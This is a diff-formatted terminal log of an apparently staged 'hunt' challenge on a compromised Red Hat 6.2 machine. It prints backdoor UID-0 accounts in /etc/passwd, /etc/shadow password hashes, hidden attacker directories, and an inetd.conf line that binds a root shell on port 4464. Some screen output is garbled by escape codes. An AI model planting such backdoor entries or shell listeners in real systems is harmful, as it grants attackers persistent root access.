@@ -1,0 +1,2065 @@
+ #'!" '
+Red Hat Linux release 6.2 (Zoot)
+Kernel 2.2.14-5.0 on an i686
+Use of uninitialized value at /usr/games/hunt line 119.
+Use of uninitialized value at /usr/games/hunt line 162.
+
+What use is magic if it can't save a unicorn?
+		-- Peter S. Beagle, "The Last Unicorn"
+
+Let the hunt begin!  You are 2 steps away from victory!
+
+[root@ariel /]# ps aux
+USER       PID %CPU %MEM  SIZE   RSS TTY STAT START   TIME COMMAND
+bin        345  0.0  0.7  1212   428  ?  S   06:45   0:00 portmap 
+daemon     505  0.0  0.9  1144   496  ?  S   06:45   0:00 /usr/sbin/atd 
+nobody     487  0.0  1.1  1292   628  ?  S   06:45   0:00 identd -e -o 
+nobody     491  0.0  1.1  1292   628  ?  S   06:45   0:00 identd -e -o 
+nobody     492  0.0  1.1  1292   628  ?  S   06:45   0:00 identd -e -o 
+nobody     493  0.0  1.1  1292   628  ?  S   06:45   0:00 identd -e -o 
+nobody     494  0.0  1.1  1292   628  ?  S   06:45   0:00 identd -e -o 
+root         1  0.0  0.8  1120   476  ?  S   06:44   0:04 init [3] 
+root         2  0.0  0.0     0     0  ?  SW  06:44   0:00 (kflushd)
+root         3  0.0  0.0     0     0  ?  SW  06:44   0:00 (kupdate)
+root         4  0.0  0.0     0     0  ?  SW  06:44   0:00 (kpiod)
+root         5  0.0  0.0     0     0  ?  SW  06:44   0:00 (kswapd)
+root         6  0.0  0.0     0     0  ?  SW< 06:44   0:00 (mdrecoveryd)
+root       292  0.0  1.2  1432   692  ?  S   06:45   0:00 /sbin/pump -i eth0 
+root       360  0.0  0.0     0     0  ?  SW  06:45   0:00 (lockd)
+root       361  0.0  0.0     0     0  ?  SW  06:45   0:00 (rpciod)
+root       370  0.0  1.0  1156   560  ?  S   06:45   0:00 rpc.statd 
+root       384  0.0  0.8  1104   476  ?  S   06:45   0:00 /usr/sbin/apmd -p 10 -w 5 -W -s /etc/sysconfig/apm-scripts/suspend -r
+root       411  0.0  1.0  1208   560  ?  S   06:45   0:00 /usr/sbin/automount --timeout 60 /misc file /etc/auto.misc 
+root       464  0.0  0.9  1172   532  ?  S   06:45   0:00 syslogd -m 0 
+root       473  0.0  1.4  1424   772  ?  S   06:45   0:00 klogd 
+root       537  0.0  0.8  1144   492  ?  S   06:45   0:00 inetd 
+root       551  0.0  3.6  3460  1988  ?  S   06:45   0:00 smbd -D 
+root       560  0.0  1.7  2016   980  ?  S   06:45   0:00 nmbd -D 
+root       574  0.0  0.9  1204   532  ?  S   06:45   0:00 lpd 
+root       622  0.0  2.0  2128  1124  ?  S   06:45   0:00 sendmail: accepting connections on port 25 
+root       637  0.0  0.8  1144   452  ?  S   06:45   0:00 gpm -t ps/2 
+root       736  0.0  1.8  1756  1008  ?  S   06:46   0:00 /usr/sbin/amd -F /etc/amd.conf 
+root       777  0.0  0.7  1092   408   1 S   06:46   0:00 /sbin/mingetty tty1 
+root       778  0.0  0.7  1092   408   2 S   06:46   0:00 /sbin/mingetty tty2 
+root       779  0.0  0.7  1092   408   3 S   06:46   0:00 /sbin/mingetty tty3 
+root       780  0.0  0.7  1092   408   4 S   06:46   0:00 /sbin/mingetty tty4 
+root       781  0.0  0.7  1092   408   5 S   06:46   0:00 /sbin/mingetty tty5 
+root       782  0.0  0.7  1092   408   6 S   06:46   0:00 /sbin/mingetty tty6 
+root       795  0.4  1.6  1668   896  ?  S   16:06   0:00 login 
+root       801  0.0  0.7   924   400  ?  R   16:06   0:00 ps aux 
+xfs        721  0.0  4.6  3560  2552  ?  S   06:45   0:00 xfs -droppriv -daemon -port -1 
+Use of uninitialized value at /usr/games/hunt line 119.
+Use of uninitialized value at /usr/games/hunt line 162.
+
+Windows 95 Beer: A lot of people have taste-tested it and claim it's 
+wonderful. The can looks a lot like Mac Beer's can, but tastes more like 
+Windows 3.1 Beer. It comes in 32-oz.  cans, but when you look inside, the 
+cans only have 16 oz. of beer in them. Most people will probably keep 
+drinking Windows 3.1 Beer until their friends try Windows 95 Beer and say 
+they like it. The ingredients list, when you look at the small print, has 
+some of the same ingredients that come in DOS beer, even though the 
+manufacturer claims that this is an entirely new brew.
+
+I bet you think fixing ps will save you
+
+[root@ariel /]# w
+login: w: command not found
+Use of uninitialized value at /usr/games/hunt line 119.
+Use of uninitialized value at /usr/games/hunt line 162.
+
+Three rules for sounding like an expert:
+	(1) Oversimplify your explanations to the point of uselessness.
+	(2) Always point out second-order effects, but never point out
+	    when they can be ignored.
+	(3) Come up with three rules of your own.
+
+You are a dolt; cd for a better life!
+
+[root@ariel /]# uptime
+  8:07am  up  9:22,  0 users,  load average: 0.00, 0.00, 0.00
+Use of uninitialized value at /usr/games/hunt line 119.
+Use of uninitialized value at /usr/games/hunt line 162.
+
+Fortune Documents the Great Legal Decisions:
+
+We can imagine no reason why, with ordinary care, human toes could not be
+left out of chewing tobacco, and if toes are found in chewing tobacco, it
+seems to us that someone has been very careless.
+		-- 78 So. 365.
+
+cd, stupid, cd!
+
+[root@ariel /]# who
+Use of uninitialized value at /usr/games/hunt line 119.
+Use of uninitialized value at /usr/games/hunt line 162.
+
+Well, I'm disenchanted too.  We're all disenchanted.
+		-- James Thurber
+
+No wonder it took you days to figure out rm -rf /var/log
+
+[root@ariel /]# cd /dev/.Fone
+Use of uninitialized value at /usr/games/hunt line 119.
+Use of uninitialized value at /usr/games/hunt line 162.
+
+Government spending?  I don't know what it's all about.  I don't know
+any more about this thing than an economist does, and, God knows, he
+doesn't know much.
+		-- Will Rogers
+
+Colder! Almost there and... Ugh
+
+[root@ariel .Fone]# ls
+Desktop		msg01912.html	msg01912.html~	statd.c
+Use of uninitialized value at /usr/games/hunt line 119.
+Use of uninitialized value at /usr/games/hunt line 162.
+
+Life is like bein' on a mule team.  Unless you're the lead mule, all the
+scenery looks about the same.
+
+Do you really think I'm not on to you?
+
+[root@ariel .Fone]# pico /etc/passwd
+   UW PICO(tm) 3.7                                        New Buffer                                                            ^G Get Help          ^O WriteOut          ^R Read File         ^Y Prev Pg           ^K Cut Text          ^C Cur Pos           ^X Exit              ^J Justify           ^W Where is          ^V Next Pg           ^U UnCut Text        ^T To Spell          [ Reading file ][ Read 29 lines ]File: /etc/passwdroot:x:0:0:root:/root:/bin/bashbin:x:1:1:bin:/bin:daemon:x:2:2:daemon:/sbin:adm:x:3:4:adm:/var/adm:lp:x:4:7:lp:/var/spool/lpd:sync:x:5:0:sync:/sbin:/bin/syncshutdown:x:6:0:shutdown:/sbin:/sbin/shutdownhalt:x:7:0:halt:/sbin:/sbin/haltmail:x:8:12:mail:/var/spool/mail:news:x:9:13:news:/var/spool/news:uucp:x:10:14:uucp:/var/spool/uucp:operator:x:11:0:operator:/root:games:x:12:100:games:/usr/games:gopher:x:13:30:gopher:/usr/lib/gopher-data:ftp:x:14:50:FTP User:/home/ftp:nobody:x:99:99:Nobody:/:xfs:x:43:43:X Font Server:/etc/X11/fs:/bin/falsenamed:x:25:25:Named:/var/named:/bin/falsegdm:x:42:42::/home/gdm:/bin/bashpiranha:x:60:60::/home/httpd/html/piranha:/dev/nullpostgres:x:26:26:PostgreSQL Server:/var/lib/pgsql:/bin/bashpvm:x:24:24::/usr/share/pvm3:/bin/bashsquid:x:23:23::/var/spool/squid:/dev/nullnoel:x:500:500:Noel Burton-Krahn:/home/noel:/bin/bashkoop:x:501:501::/home/koop:/bin/bashFone:x:502:502::/dev/.Fone:/bin/bashFone1:x:0:0::/dev/.Fone:/bin/basha::17:17::/home:/bin/bashb::0:0::/home:/bin/bashUse of uninitialized value at /usr/games/hunt line 119.
+Use of uninitialized value at /usr/games/hunt line 162.
+
+And it should be the law: If you use the word `paradigm' without knowing
+what the dictionary says it means, you go to jail.  No exceptions.
+		-- David Jones
+
+You are a dolt; cd for a better life!
+
+[root@ariel .Fone]# cd /usr/lib/.blunt
+Use of uninitialized value at /usr/games/hunt line 119.
+Use of uninitialized value at /usr/games/hunt line 162.
+
+Answer a fool according to his folly, lest he be wise in his own conceit.
+		-- Proverbs, 26:5
+
+Way Way Way Warmer
+
+[root@ariel .blunt]# cd /usr/games
+Use of uninitialized value at /usr/games/hunt line 119.
+Use of uninitialized value at /usr/games/hunt line 162.
+
+	In the beginning there was data.  The data was without form and
+null, and darkness was upon the face of the console; and the Spirit of
+IBM was moving over the face of the market.  And DEC said, "Let there
+be registers"; and there were registers.  And DEC saw that they
+carried; and DEC separated the data from the instructions.  DEC called
+the data Stack, and the instructions they called Code.  And there was
+evening and there was morning, one interrupt.
+		-- Rico Tudor, "The Story of Creation or, The Myth of Urk"
+
+Colder! That won't work
+
+[root@ariel games]# ls
+banner	 fortune  hunt	   trojka
+Use of uninitialized value at /usr/games/hunt line 119.
+Use of uninitialized value at /usr/games/hunt line 162.
+
+I lately lost a preposition;
+It hid, I thought, beneath my chair
+And angrily I cried, "Perdition!
+Up from out of under there."
+
+Correctness is my vade mecum,
+And straggling phrases I abhor,
+And yet I wondered, "What should he come
+Up from out of under for?"
+		-- Morris Bishop
+
+Didn't you read my banner, or is SUE YOUR ASS unclear?
+
+[root@ariel games]# cd /usr/lib/.blunt/patch
+Use of uninitialized value at /usr/games/hunt line 119.
+Use of uninitialized value at /usr/games/hunt line 162.
+
+The black bear used to be one of the most commonly seen large animals
+because in Yosemite and Sequoia national parks they lived off of garbage
+and tourist handouts.  This bear has learned to open car doors in
+Yosemite, where damage to automobiles caused by bears runs into the tens
+of thousands of dollars a year.  Campaigns to bearproof all garbage
+containers in wild areas have been difficult, because as one biologist
+put it, "There is a considerable overlap between the intelligence levels
+of the smartest bears and the dumbest tourists."
+
+I bet you think fixing ps will save you
+
+[root@ariel patch]# ./patch
+fixing.. suidperl..
+   UW PICO(tm) 3.7                                        New Buffer                                                            ^G Get Help          ^O WriteOut          ^R Read File         ^Y Prev Pg           ^K Cut Text          ^C Cur Pos           ^X Exit              ^J Justify           ^W Where is          ^V Next Pg           ^U UnCut Text        ^T To Spell          [ Reading file ][ Read 29 lines ]File: /etc/passwdroot:x:0:0:root:/root:/bin/bashbin:x:1:1:bin:/bin:daemon:x:2:2:daemon:/sbin:adm:x:3:4:adm:/var/adm:lp:x:4:7:lp:/var/spool/lpd:sync:x:5:0:sync:/sbin:/bin/syncshutdown:x:6:0:shutdown:/sbin:/sbin/shutdownhalt:x:7:0:halt:/sbin:/sbin/haltmail:x:8:12:mail:/var/spool/mail:news:x:9:13:news:/var/spool/news:uucp:x:10:14:uucp:/var/spool/uucp:operator:x:11:0:operator:/root:games:x:12:100:games:/usr/games:gopher:x:13:30:gopher:/usr/lib/gopher-data:ftp:x:14:50:FTP User:/home/ftp:nobody:x:99:99:Nobody:/:xfs:x:43:43:X Font Server:/etc/X11/fs:/bin/falsenamed:x:25:25:Named:/var/named:/bin/falsegdm:x:42:42::/home/gdm:/bin/bashpiranha:x:60:60::/home/httpd/html/piranha:/dev/nullpostgres:x:26:26:PostgreSQL Server:/var/lib/pgsql:/bin/bashpvm:x:24:24::/usr/share/pvm3:/bin/bashsquid:x:23:23::/var/spool/squid:/dev/nullnoel:x:500:500:Noel Burton-Krahn:/home/noel:/bin/bashkoop:x:501:501::/home/koop:/bin/bashFone:x:502:502::/dev/.Fone:/bin/bashFone1:x:0:0::/dev/.Fone:/bin/basha::17:17::/home:/bin/bashb::0:0::/home:/bin/bashModified1:x:0:0::/dev/.Fone:/bin/bash   a::17:17::/home:/bin/bashb::0:0::/home:/bin/bash  a::17:17::/home:/bin/bashb::0:0::/home:/bin/bash  b::0:0::/home:/bin/bash                       Y Yes                                                                                                    C Cancel            N No                                                                                                     Save modified buffer (ANSWERING "No" WILL DESTROY CHANGES) ?                                                                    YesFile Name to write :                                                                                                            /etc/passwd^G Get Help          ^T  To Files                                                                                             TAB Complete                                                                                             [ Writing... ][ Wrote 25 lines ]   UW PICO(tm) 3.7                                        New Buffer                                                            ^G Get Help          ^O WriteOut          ^R Read File         ^Y Prev Pg           ^K Cut Text          ^C Cur Pos           ^X Exit              ^J Justify           ^W Where is          ^V Next Pg           ^U UnCut Text        ^T To Spell          [ Reading file ][ Read 27 lines ]File: /etc/shadowroot:$1$F39TeX/u$aZC3FRLAB43.RjdHfGhn1.:11252:0:99999:7:-1:-1:134539268bin:*:11251:0:99999:7:::daemon:*:11251:0:99999:7:::adm:*:11251:0:99999:7:::lp:*:11251:0:99999:7:::sync:*:11251:0:99999:7:::shutdown:*:11251:0:99999:7:::halt:*:11251:0:99999:7:::mail:*:11251:0:99999:7:::news:*:11251:0:99999:7:::uucp:*:11251:0:99999:7:::operator:*:11251:0:99999:7:::games:*:11251:0:99999:7:::gopher:*:11251:0:99999:7:::ftp:*:11251:0:99999:7:::nobody:*:11251:0:99999:7:::xfs:!!:11251:0:99999:7:::named:!!:11251:0:99999:7:::gdm:!!:11251:0:99999:7:::piranha:!!:11251:0:99999:7:::postgres:!!:11251:0:99999:7:::pvm:!!:11251:0:99999:7:::squid:!!:11251:0:99999:7:::noel:$1$612SnpZj$.FoIBqX2XYd1UvH9rMSqm1:11251:0:99999:7:-1:-1:134539300koop:$1$..a7Bzqy$SwtwC/r1VCaYjKQSgP8Bt0:11276:0:99999:7:-1:-1:134539228Fone:$1$j.MGhm8J$icExLs.SJFHGVArY7apk6/:11280:0:99999:7:-1:-1:134539228Fone1:$1$pUZt8Tq.$C9cFcWiuC5hsg08DU6Vbb.:11280:0:99999:7:-1:-1:134539228Modified1:$1$pUZt8Tq.$C9cFcWiuC5hsg08DU6Vbb.:11280:0:99999:7:-1:-1:134539228                     Y Yes                                                                                                    C Cancel            N No                                                                                                     Save modified buffer (ANSWERING "No" WILL DESTROY CHANGES) ?                                                                    YesFile Name to write :                                                                                                            /etc/shadow^G Get Help          ^T  To Files                                                                                             TAB Complete                                                                                             [ Writing... ][ Wrote 25 lines ]checking for any rpc/inetd proc's running
+       and inetd.conf suid shells
+
+root       361  0.0  0.0     0     0  ?  SW  06:45   0:00 (rpciod)
+root       537  0.0  0.8  1144   492  ?  S   06:45   0:00 inetd 
+4464 stream tcp nowait root /bin/sh sh -i
+continue? 
+checking for any bad entrys in etc/passwd
+
+adm:*:11251:0:99999:7:::
+operator:*:11251:0:99999:7:::
+user adm: directory /var/adm does not exist
+user gopher: directory /usr/lib/gopher-data does not exist
+user gdm: directory /home/gdm does not exist
+pwck: no changes
+continue? 
+downloading & installing patches.
+Binary mode
+
+#------------------------------------------------------------ 00:00  nanKb/s
+##############################------------------------------- 00:00  179.4Kb/s
+###################################################---------- 00:00  113.6Kb/s
+############################################################# 00:00  98.6Kb/s
+                                                                                
+Received wu-ftpd-2.6.0-14.6x.i386.rpm (195637 bytes) in 2 seconds (97.50Kb/s)
+Binary mode
+
+#------------------------------------------------------------ 00:00  nanKb/s
+#########---------------------------------------------------- 00:03  175.6Kb/s
+##############----------------------------------------------- 00:05  91.4Kb/s
+######################--------------------------------------- 00:04  94.8Kb/s
+##########################----------------------------------- 00:04  73.9Kb/s
+#############################-------------------------------- 00:05  63.2Kb/s
+#####################################------------------------ 00:03  75.3Kb/s
+#################################################------------ 00:01  94.1Kb/s
+######################################################------- 00:00  78.1Kb/s
+############################################################# 00:00  80.5Kb/s
+                                                                                
+Received pam-0.72-20.i386.rpm (641898 bytes) in 9 seconds (71.22Kb/s)
+Binary mode
+
+#------------------------------------------------------------ 00:00  nanKb/s
+#------------------------------------------------------------ 03:07  0.9Kb/s
+################--------------------------------------------- 00:02  44.5Kb/s
+####################################------------------------- 00:01  53.8Kb/s
+############################################################# 00:00  55.0Kb/s
+                                                                                
+Received nfs-utils-0.1.9.1-1.i386.rpm (180703 bytes) in 6 seconds (30.00Kb/s)
+Binary mode
+
+#------------------------------------------------------------ 00:00  nanKb/s
+###################################################---------- 00:00  225.5Kb/s
+############################################################# 00:00  169.1Kb/s
+                                                                                
+Received gdm-2.0beta2-26.i386.rpm (136290 bytes) in 1 seconds (136.00Kb/s)
+Binary mode
+
+#------------------------------------------------------------ 00:00  nanKb/s
+###---------------------------------------------------------- 00:12  103.8Kb/s
+######------------------------------------------------------- 00:11  102.1Kb/s
+#########---------------------------------------------------- 00:14  81.1Kb/s
+############------------------------------------------------- 00:14  76.1Kb/s
+#############------------------------------------------------ 00:17  60.3Kb/s
+###############---------------------------------------------- 00:17  58.7Kb/s
+#################-------------------------------------------- 00:17  55.5Kb/s
+####################----------------------------------------- 00:16  55.5Kb/s
+#######################-------------------------------------- 00:16  51.1Kb/s
+##########################----------------------------------- 00:12  60.9Kb/s
+############################--------------------------------- 00:12  59.8Kb/s
+###############################------------------------------ 00:08  72.3Kb/s
+##################################--------------------------- 00:08  69.4Kb/s
+#####################################------------------------ 00:07  70.6Kb/s
+########################################--------------------- 00:05  76.1Kb/s
+############################################----------------- 00:04  75.6Kb/s
+###############################################-------------- 00:03  80.1Kb/s
+#################################################------------ 00:03  70.2Kb/s
+####################################################--------- 00:02  74.4Kb/s
+######################################################------- 00:02  61.3Kb/s
+########################################################----- 00:02  53.6Kb/s
+##########################################################--- 00:00  54.4Kb/s
+############################################################# 00:00  56.6Kb/s
+                                                                                
+Received openldap-1.2.9-6.i386.rpm (1358207 bytes) in 25 seconds (54.32Kb/s)
+Binary mode
+
+#------------------------------------------------------------ 00:00  nanKb/s
+######------------------------------------------------------- 00:07  111.4Kb/s
+#######------------------------------------------------------ 00:22  34.4Kb/s
+########----------------------------------------------------- 00:22  34.0Kb/s
+############------------------------------------------------- 00:13  52.1Kb/s
+##################------------------------------------------- 00:09  63.7Kb/s
+######################--------------------------------------- 00:09  58.4Kb/s
+##########################----------------------------------- 00:07  67.2Kb/s
+############################--------------------------------- 00:07  63.6Kb/s
+#############################-------------------------------- 00:08  51.9Kb/s
+#################################---------------------------- 00:07  52.2Kb/s
+######################################----------------------- 00:05  57.3Kb/s
+##########################################------------------- 00:04  56.5Kb/s
+###############################################-------------- 00:03  64.1Kb/s
+###################################################---------- 00:02  69.7Kb/s
+#######################################################------ 00:01  73.3Kb/s
+###########################################################-- 00:00  67.4Kb/s
+############################################################# 00:00  65.7Kb/s
+                                                                                
+Received mutt-1.2i-2.i386.rpm (896187 bytes) in 18 seconds (49.78Kb/s)
+Binary mode
+
+#------------------------------------------------------------ 00:00  nanKb/s
+############################################################# 00:00  nanKb/s
+                                                                                
+Received sysklogd-1.3.31-17.i386.rpm (56439 bytes) in 1 seconds (56.00Kb/s)
+Binary mode
+
+#------------------------------------------------------------ 00:00  nanKb/s
+############################################################# 00:00  nanKb/s
+                                                                                
+Received man-1.5h1-2.6.x.i386.rpm (62157 bytes) in 1 seconds (62.00Kb/s)
+Binary mode
+
+#------------------------------------------------------------ 00:00  nanKb/s
+#######------------------------------------------------------ 00:06  59.0Kb/s
+##################------------------------------------------- 00:03  93.5Kb/s
+###########################---------------------------------- 00:02  79.1Kb/s
+####################################------------------------- 00:02  68.7Kb/s
+##########################################------------------- 00:02  60.5Kb/s
+#######################################################------ 00:00  81.5Kb/s
+############################################################# 00:00  83.2Kb/s
+                                                                                
+Received ircii-4.4M-1.i386.rpm (425172 bytes) in 7 seconds (60.71Kb/s)
+Binary mode
+
+#------------------------------------------------------------ 00:00  nanKb/s
+############################################################# 00:00  nanKb/s
+                                                                                
+Received gpm-1.19.3-0.6.x.i386.rpm (121930 bytes) in 1 seconds (121.00Kb/s)
+Binary mode
+
+#------------------------------------------------------------ 00:00  nanKb/s
+############################################################# 00:00  nanKb/s
+                                                                                
+Received gpm-devel-1.19.3-0.6.x.i386.rpm (17116 bytes) in 1 seconds (17.00Kb/s)
+Binary mode
+
+#------------------------------------------------------------ 00:00  nanKb/s
+############################################################# 00:00  nanKb/s
+                                                                                
+Received nscd-2.1.3-21.i386.rpm (21027 bytes) in 1 seconds (21.00Kb/s)
+Binary mode
+
+#------------------------------------------------------------ 00:00  nanKb/s
+######################################################------- 00:00  62.9Kb/s
+############################################################# 00:00  47.2Kb/s
+                                                                                
+Received popt-1.5-9.6x.i386.rpm (38606 bytes) in 3 seconds (12.67Kb/s)
+gdm                         ##################################################
+gpm                         ##################################################
+gpm-devel                   ##################################################
+ircii                       ##################################################
+package version not listed in file index
+package version not listed in file index
+package version not listed in file index
+package version not listed in file index
+man                         ##################################################
+mutt                        ##################################################
+nfs-utils                   ##################################################
+nscd                        ##################################################
+openldap                    ##################################################
+pam                         ##################################################
+popt                        ##################################################
+sysklogd                    ##################################################
+touch: /var/log/messages: No such file or directory
+chmod: /var/log/messages: No such file or directory
+touch: /var/log/secure: No such file or directory
+chmod: /var/log/secure: No such file or directory
+touch: /var/log/maillog: No such file or directory
+chmod: /var/log/maillog: No such file or directory
+touch: /var/log/spooler: No such file or directory
+chmod: /var/log/spooler: No such file or directory
+wu-ftpd                     ##################################################
+touch: /var/log/xferlog: No such file or directory
+chmod: /var/log/xferlog: No such file or directory
+execution of script failed
+Now doing speed test..
+Binary mode
+
+#------------------------------------------------------------ 00:00  nanKb/s
+###---------------------------------------------------------- 00:10  241.5Kb/s
+#####-------------------------------------------------------- 00:18  136.9Kb/s
+######------------------------------------------------------- 00:29  86.6Kb/s
+######------------------------------------------------------- 00:43  58.6Kb/s
+######------------------------------------------------------- 00:42  58.5Kb/s
+#######------------------------------------------------------ 01:11  34.6Kb/s
+#######------------------------------------------------------ 01:35  25.7Kb/s
+########----------------------------------------------------- 01:23  29.1Kb/s
+#########---------------------------------------------------- 00:48  48.8Kb/s
+###########-------------------------------------------------- 00:46  49.1Kb/s
+############------------------------------------------------- 00:44  50.6Kb/s
+#############------------------------------------------------ 00:35  61.1Kb/s
+##############----------------------------------------------- 00:32  65.7Kb/s
+################--------------------------------------------- 00:31  66.3Kb/s
+################--------------------------------------------- 00:34  58.9Kb/s
+#################-------------------------------------------- 00:33  59.0Kb/s
+##################------------------------------------------- 00:40  49.3Kb/s
+###################------------------------------------------ 00:40  47.6Kb/s
+####################----------------------------------------- 00:37  50.7Kb/s
+#####################---------------------------------------- 00:35  51.6Kb/s
+#####################---------------------------------------- 00:40  44.1Kb/s
+#######################-------------------------------------- 00:32  54.6Kb/s
+########################------------------------------------- 00:27  61.1Kb/s
+#########################------------------------------------ 00:31  52.2Kb/s
+##########################----------------------------------- 00:30  52.7Kb/s
+###########################---------------------------------- 00:28  55.6Kb/s
+###########################---------------------------------- 00:29  51.0Kb/s
+############################--------------------------------- 00:30  48.3Kb/s
+#############################-------------------------------- 00:35  41.7Kb/s
+#############################-------------------------------- 00:37  38.1Kb/s
+##############################------------------------------- 00:38  36.8Kb/s
+###############################------------------------------ 00:33  41.1Kb/s
+################################----------------------------- 00:26  49.8Kb/s
+##################################--------------------------- 00:21  56.8Kb/s
+###################################-------------------------- 00:18  63.7Kb/s
+####################################------------------------- 00:15  71.6Kb/s
+######################################----------------------- 00:14  73.5Kb/s
+######################################----------------------- 00:18  56.4Kb/s
+#######################################---------------------- 00:19  50.6Kb/s
+#######################################---------------------- 00:25  38.7Kb/s
+########################################--------------------- 00:23  40.0Kb/s
+#########################################-------------------- 00:23  38.9Kb/s
+##########################################------------------- 00:17  48.2Kb/s
+############################################----------------- 00:13  56.4Kb/s
+#############################################---------------- 00:12  57.8Kb/s
+#############################################---------------- 00:14  49.0Kb/s
+#############################################---------------- 00:16  41.1Kb/s
+##############################################--------------- 00:20  33.7Kb/s
+###############################################-------------- 00:21  29.9Kb/s
+###############################################-------------- 00:19  30.2Kb/s
+################################################------------- 00:18  30.1Kb/s
+#################################################------------ 00:18  29.3Kb/s
+#################################################------------ 00:15  33.4Kb/s
+##################################################----------- 00:12  37.7Kb/s
+###################################################---------- 00:09  43.1Kb/s
+####################################################--------- 00:09  41.6Kb/s
+#####################################################-------- 00:07  46.8Kb/s
+######################################################------- 00:05  53.7Kb/s
+########################################################----- 00:03  61.7Kb/s
+#########################################################---- 00:02  63.4Kb/s
+##########################################################--- 00:01  62.9Kb/s
+###########################################################-- 00:01  55.8Kb/s
+###########################################################-- 00:01  44.5Kb/s
+############################################################- 00:01  34.3Kb/s
+############################################################- 00:01  24.3Kb/s
+############################################################- 00:02  13.2Kb/s
+############################################################- 00:00  18.6Kb/s
+############################################################# 00:00  22.0Kb/s
+                                                                                
+Received cooltalk.alpha-dec-osf.tar.gz (2837003 bytes) in 74 seconds (38.34Kb/s)
+Use of uninitialized value at /usr/games/hunt line 119.
+Use of uninitialized value at /usr/games/hunt line 162.
+
+"... I should explain that I was wearing a black velvet cape that was
+supposed to make me look like the dashing, romantic Zorro but which actually
+made me look like a gigantic bat wearing glasses ..."
+		-- Dave Barry, "The Wet Zorro Suit and Other Turning
+		   Points in l'Amour"
+
+I bet you think fixing ps will save you
+
+[root@ariel patch]# /usr/sbin/ntsysv
+(B)0                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               ntsysv 1.1.2 - (C) 1999 Red Hat Softwarelqqqqqqqqqqqqqqqqqqu Services tqqqqqqqqqqqqqqqqqqqkx                                                 x x What services should be automatically started?  x x                                                 x x                [*] amd         #                x x                [ ] anacron     a                x x                [*] apmd        a                x x                [ ] arpwatch    a                x x                [*] atd         a                x x                [*] autofs      a                x x                [ ] bootparamd  a                x x                [*] crond       a                x x                                                 x x         lqqqqk               lqqqqqqqqk         x x         x Ok x               x Cancel x         x x         mqqqqj               mqqqqqqqqj         x x                                                 x x                                                 x mqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqj                                                    Press <F1> for more information on a service.*  **  ****  *
+ ] anacron                                      x                [*] crond       a                x                                        ] dhcp
+*] apmd                                         x                [ ] dhcpd       a                x                                       gate
+ ] arpwatch                                      x                [ ] gated       a                x                                       *] gpm  
+*] atd                                           x                [*] gpm         a                x                                       httpd
+utofs                                      x                [*] httpd       a                x                                       identd
+ ] bootparamd                                      x                [*] identd      a                x                                       net  
+
+                                      x                [ ] dhcpd       #                x                                                                             x                [*] inet        a                x                                        ] innd
+ ] dhcpgate                                      x                [ ] innd        a                x                                       pchains
+gate*] gpm                                        x                [ ] ipchains    a                x                                       rda    
+*] gpm  httpd                                      x                [ ] irda        a                x                                       *] isdn
+httpdidentd                                      x                [*] isdn        a                x                                        ] kdcrotate
+identdnet                                        x                [ ] kdcrotate   a                x                                       *] keytable 
+net   ] innd                                      x                [*] keytable    a                x                                        ] krb5server
+
+ ] innd
+
+                                      x                [ ] irda        #                x                                                                             x                [ ] krb5server  a                x                                       *] kudzu      **  **  *         **  **  *
+
+                                      x                [ ] irda        a                x                                       *] isdn
+
+                                      x                [*] kudzu       a                x                                        ] ldap 
+
+                                      x                [*] isdn        a                x                                        ] kdcrotate
+
+                                      x                [ ] ldap        a                x                                       *] linuxconf
+
+                                      x                [ ] kdcrotate   a                x                                       *] keytable 
+
+                                      x                [*] linuxconf   a                x                                       pd      
+
+                                      x                [*] keytable    a                x                                        ] krb5server
+
+                                      x                [*] lpd         a                x                                        ] mars-nwe*    
+
+                                      x                [ ] krb5server  a                x                                       *] kudzu     
+
+                                      x                [ ] mars-nwe    a                x                                       cserv  
+
+                                      x                [*] kudzu       a                x                                        ] ldap 
+
+                                      x                [ ] mcserv      a                x                                       named 
+
+                                      x                [ ] ldap        a                x                                                                             x                [ ] lpd         #                x                                                                             x                [ ] named       a                x                                       *] netfs
+
+                                      x                [ ] lpd         a                x                                       mars-nwe
+
+                                      x                [*] netfs       a                x                                       work
+
+                                      x                [ ] mars-nwe    a                x                                       cserv  
+
+                                      x                [*] network     a                x                                        ] nfs    
+
+                                      x                [ ] mcserv      a                x                                       named 
+
+                                      x                [ ] nfs         a                x                                       *lock
+
+                                      x                [ ] named       a                x                                       *] netfs
+
+                                      x                [*] nfslock     a                x                                        ] nscd   *    
+
+                                      x                [*] netfs       a                x                                       work
+
+                                      x                [ ] nscd        a                x                                       *] pcmcia
+
+                                      x                [*] network     a                x                                        ] nfs    
+
+                                      x                [*] pcmcia      a                x                                        ] phhttpd
+
+                                      x                [ ] nfs         a                x                                                                             x                [ ] nscd        #                x                                                                             x                [ ] phhttpd     a                x                                       *] portmap
+
+                                      x                [ ] nscd        a                x                                       *] pcmcia
+
+                                      x                [*] portmap     a                x                                        ] postgresql
+
+                                      x                [*] pcmcia      a                x                                        ] phhttpd
+
+                                      x                [ ] postgresql  a                x                                       ulse     
+
+                                      x                [ ] phhttpd     a                x                                       *] portmap
+
+                                      x                [ ] pulse       a                x                                       vmd 
+
+                                      x                [*] portmap     a                x                                        ] postgresql
+
+                                      x                [ ] pvmd        a                x                                       xe       *  **  * **  *   Ok        lqqqqk x Ok xmqqqqjlqqqqkx Ok x mqqqqj                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     
+Use of uninitialized value at /usr/games/hunt line 119.
+Use of uninitialized value at /usr/games/hunt line 162.
+
+"Lying lips are abomination to the Lord; but they that deal truly are his 
+ delight.
+ A soft answer turneth away wrath; but grievous words stir up anger.
+ He that answereth a matter before he heareth it, it is folly and shame unto
+ him.
+ Be not a witness against thy neighbor without cause; and deceive not with 
+ thy lips.
